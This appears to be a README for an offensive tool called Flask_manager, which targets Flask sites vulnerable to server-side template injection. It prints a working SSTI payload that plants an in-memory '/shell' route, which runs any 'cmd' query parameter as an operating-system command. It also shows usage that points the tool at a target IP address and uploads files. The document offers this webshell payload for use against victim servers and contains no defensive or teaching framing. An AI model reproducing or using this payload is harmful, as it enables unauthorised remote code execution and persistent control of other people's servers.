# Flask_manager

If you know a website  based on Flask framework, which is SSTI vulnerable then, this tool will help you to generate a Flask memory horse payload for exploiting SSTI (Server-Side Template Injection) and gaining RCE (Remote Code Execution). And also it will help you to get the Webshell on the victim server. 

## Required operating environment
python3.x

## About

This tool can generate payload :

```
url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})
```



## Usage

| Command                     | Description    |
| :-------------------------- | -------------- |
| flask_manager --help        | Help           |
| flask_manager --url x.x.x.x | Target connect |



## Examples

* Start the tool

```bash
python flask_manager --url 192.168.225.149
```

* Upload file

```
upload
```
